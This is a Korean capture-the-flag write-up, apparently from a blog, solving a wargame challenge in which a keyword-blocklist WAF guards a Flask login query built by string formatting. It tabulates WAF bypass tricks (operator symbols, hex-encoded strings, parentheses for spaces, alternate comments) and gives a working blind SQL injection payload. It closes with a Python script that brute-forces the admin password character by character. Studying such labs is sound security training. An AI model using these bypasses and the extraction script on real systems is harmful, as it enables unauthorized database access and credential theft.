## Concept
`sql injection bypass WAF Advanced`문제는 SQLi에 사용되는 키워드들을 필터링하는 기능이 추가되어있어 이를 우회하여 플래그를 얻는 문제이다.

| 우회 대상 (WAF 차단 항목) | 우회 기법 (Bypass Method) | 핵심 원리 및 설명 | 실제 적용 페이로드 예시 |
| :--- | :--- | :--- | :--- |
| **논리 연산자** (`and`, `or`) | 대체 연산 기호 활용 | WAF가 단어 패턴을 검사할 때, 동일 기능의 특수 기호 연산자로 치환 | `and` ➡️ `&&`<br>`or` ➡️ `\|\|` |
| **핵심 키워드** (`admin`) | 16진수 (Hex) 인코딩 | 문자열을 16진수 상수로 변환. DBMS가 내부에서 자동으로 문자열로 복기함 | `'admin'` ➡️ `0x61646d696e` |
| **공백 문자** (` `, `\n`, `\t` 등) | 괄호 `()` 구문 분리 | 공백 없이 키워드와 조건을 괄호로 묶어 독립적인 쿼리로 실행 | `WHERE uid='admin' AND ...`<br>➡️ `(uid=0x61...)&&(...)` |
| **공백 문자** (` `) | 특수 제어 문자 활용 | WAF 필터링 리스트에 누락된 특수 공백 문자나 URL 인코딩 값 사용 | `%a0` (Non-breaking Space)<br>`%0a` (개행 문자) |
| **주석 기호** (`--`, `+`, `-`) | 대체 주석 기호 사용 | 뒷부분 쿼리 파편을 날리기 위해 미차단된 다른 주석 기호 활용 | `#` 사용 (URL 전송 시 `%23`) |
| **주석 기호** (`--`, `+`, `-`) | 싱글 쿼터 짝 맞춤 | 주석을 쓰지 못할 때, 맨 뒤에 정상 연산문을 붙여 기존 쿼터를 흡수 | `...=68 && '1'='1` <br>(백엔드 닫는 쿼터와 붙어 `'1'='1';` 완성) |
| **데이터 직접 출력 제한**<br>(`UNION`, `SELECT` 차단) | Blind SQL Injection | 데이터를 직접 가져오지 못하므로, 참/거짓 반응 차이를 이용해 데이터를 유추 | `ascii(substring((upw),1,1))=68` |
| **데이터베이스 엔진 특성** | 자동 형변환 (Truncate) | 숫자가 필요한 자리에 문자열 파편이 결합해도 앞의 숫자만 인식해 에러를 방지 | `...=68';` 구조가 되어도<br>MySQL은 숫자 `68`로 정상 처리 |

## 서비스 분석
### check_WAF
```py
keywords = ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', 
            '\n', '\r', '\t', '\x0b', '\x0c', '-', '+']
def check_WAF(data):
    for keyword in keywords:
        if keyword in data.lower():
            return True

    return False
```
{: file="WAF.py"}
`check_WAF`함수에서 keywords에 들어있는 문자들을 모두 필터링 하기에 `union, select, from, or, and, admin...` 은 사용할수 없다.
하지만 `and`, `or`는 `&&`나 `||`로 대체할수 있고 `URL인코딩`으로 특수 제어 문자나 admin등을 우회입력할수 있다.

### root path
```py
@app.route('/', methods=['POST', 'GET'])
def index():
    uid = request.args.get('uid')
    if uid:
        if check_WAF(uid):
            return 'your request has been blocked by WAF.'
        cur = mysql.connection.cursor()
        cur.execute(f"SELECT * FROM user WHERE uid='{uid}';")
        result = cur.fetchone()
        if result:
            return template.format(uid=uid, result=result[1])
        else:
            return template.format(uid=uid, result='')

    else:
        return template
```
{: file="rootEP.py"}
위의 `check_WAF`에서 필터링을 수행하긴 하지만 `curl.excute(...)`를 보면 사용자의 입력깂으로 SQL쿼리문을 만들어 이를 DB에서 실행하기에 SQLi 취약점이 존재한다. 필터링 우회로 `check_WAF`에 걸리지 않고 `uid=admin`인 계정으로 로그인에 성공하도록 하는 upw를 찾으면 된다.

![Bypass](/assets/img/posts/sqliWAF/bypass.png)
입력값으로 `guest'||(uid=0x61646d696e)&&(ascii(substring((upw),1,1)))=68#`를 입력하면 admin으로 결과가 출력되는것을 확인할수 있다.
PAYLOAD의 작동방식은 다음과 같다.

1. **연산자 우선순위 (Operator Precedence) 활용**: 
   MySQL에서 `&&` (AND) 연산자는 `||` (OR) 연산자보다 우선순위가 높다. 따라서 쿼리는 `(uid='guest') || ( (uid=0x61646d696e) && (ascii(...) = 68) )` 형태로 결합하여 연산된다.
2. **참(True) 조건 분기 분석**:
   뒤쪽의 AND 조건문 `(admin 계정의 패스워드 첫 글자가 'D'인가?)`이 **참(True)**일 경우, 전체 WHERE 절은 `(guest 레코드) OR (admin 레코드)` 구조가 되어 두 계정의 데이터가 모두 결과 셋(Result Set)에 포함된다.
3. **단일 레코드 반환 (`fetchone`) 맹점 공략**:
   백엔드 로직은 `cur.fetchone()`을 통해 조회된 결과 중 가장 첫 번째 레코드 하나만 가져온다. 조건이 참이 되어 `guest`와 `admin`이 모두 조회되었을 때, DBMS의 내부 정렬 및 반환 규칙에 따라 `admin` 레코드가 최상단에 위치하게 되면서 화면에 `admin`이 출력된다.
4. **거짓(False) 조건과의 반응 차이 식별 (Oracle)**:
   반대로 만약 패스워드 검증 조건이 **거짓(False)**이라면, AND 조건절이 탈락하면서 WHERE 문에는 `uid='guest'`만 남게 된다. 이 경우 화면에는 `admin`이 아닌 `guest`가 출력되거나 아무것도 나오지 않게 된다. 이 두 상태의 명확한 반응 차이(admin 출력 여부)가 **Blind SQL Injection**의 핵심 기준(Oracle)이 된다.
5. **우회 기법 결합 메커니즘**:
   * **`0x61646d696e`**: `admin` 키워드 차단을 피하기 위한 16진수(Hex) 난독화 기법이다.
   * **괄호`()` 사용**: 공백 문자(` `) 필터링을 우회하여 각 식을 독립적으로 격리 및 실행한다.
   * **`#` (주석) 기호**: 페이로드 맨 뒤에 붙어 백엔드 쿼리에 남아있던 기존 싱글 쿼터 파편(`';`)을 주석으로 무력화시켜 500 내부에러(Syntax Error)를 방지한다.


### 익스플로잇
위에서 사용한 페이로드처럼 필터링 우회를 하면 되는데 upw를 일일이 입력해보는것은 사막에서 바늘을 찾아보겠다는 같은 소리이다. 대신, 자동으로 비밀번호를 무차별대입하는 파이썬 스크립트를 작성해서 upw를 찾아내보자.
페이로드는 `guest'||(uid=0x61646d696e)&&(ascii(substring((upw),{},1)))={}#`로 이를 uid값으로 날려서 리스폰스에 admin이 있을때 이를 알아낸 패스워드에 추가하여 최종적으로 admin의 upw를 얻어내는 브루트포싱 스크립트를 작성하면 된다.
```py
import requests
import string

URL = "TARGET-URL"

# 참(True) 판별 기준 마크
SUCCESS_MARK = "admin"

# 브루트포스에 사용할 문자 셋 (알파벳 대소문자, 숫자, 특수문자 전체 포함)
TARGET_CHARS = string.printable.strip()

def extract_upw():
    flag = ""
    print("[+] admin 계정의 upw 브루트포스를 시작합니다.")
    print("-" * 50)
    
    # 패스워드 길이를 최대 50글자로 가정하고 1번째 자리부터 한 글자씩 탐색
    for length in range(1, 51):
        found_char = False
        
        for char in TARGET_CHARS:
            # WAF 필터링 우회 핵심 포인트:
            # 1. 공백 대신 괄호() 사용
            # 2. admin 단어 차단 우회를 위해 16진수 HEX 값(0x61646d696e) 사용
            # 3. and, or 차단 우비를 위해 &&, || 기호 사용
            # 4. 맨 뒤에 # 기호를 붙여 구문 문법 에러(500) 원천 차단
            char_ascii = ord(char)
            payload = f"guest'||(uid=0x61646d696e)&&(ascii(substring((upw),{length},1)))={char_ascii}#"
            
            params = {'uid': payload}
            
            try:
                # GET 요청 전송 (requests가 파라미터를 자동으로 URL 인코딩 해줍니다)
                res = requests.get(URL, params=params)
                
                # WAF에 블락되지 않고, 화면에 'admin' 글자가 포함되어 있다면 참(True)
                if SUCCESS_MARK in res.text and "blocked" not in res.text:
                    flag += char
                    print(f"[+] [{length:02d}번째 글자] 찾음: '{char}' (현재까지 확보된 upw: {flag})")
                    found_char = True
                    
                    # 플래그 닫는 괄호 '}'를 만나면 브루트포스 즉시 종료
                    if char == '}':
                        print("-" * 50)
                        print(f"[*] 플래그 추출 성공! 최종 upw: {flag}")
                        return
                    break
                    
            except requests.exceptions.RequestException as e:
                print(f"[-] 통신 에러 발생: {e}")
                return

        # 모든 문자를 대입했음에도 다음 글자를 찾지 못했다면 문자열이 끝난 것으로 판단
        if not found_char:
            print("-" * 50)
            print(f"[-] 더 이상 일치하는 문자가 없습니다. 탐색을 종료합니다.")
            print(f"[*] 확보된 upw: {flag}")
            return

if __name__ == "__main__":
    extract_upw()

```
